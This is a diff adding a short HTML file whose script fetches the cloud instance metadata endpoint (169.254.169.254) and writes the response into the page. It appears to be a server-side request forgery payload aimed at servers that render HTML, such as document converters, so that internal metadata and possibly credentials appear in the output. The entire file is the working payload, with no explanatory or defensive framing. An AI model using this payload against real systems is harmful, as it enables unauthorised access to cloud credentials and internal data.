@@ -1,0 +1,23 @@
+<html>
+<body>
+<script>
+  var sniff = new XMLHttpRequest();
+var url = "http://169.254.169.254/";
+
+
+	sniff.onreadystatechange= function(){
+		if(sniff.readyState == sniff.DONE) {
+			if(sniff.status == 200) {
+
+				request_data = sniff.responseText;
+        document.write(request_data);
+
+			}
+		}
+	};
+
+sniff.open("GET", url, true);
+sniff.send();
+    </script>
+</body>
+</html>
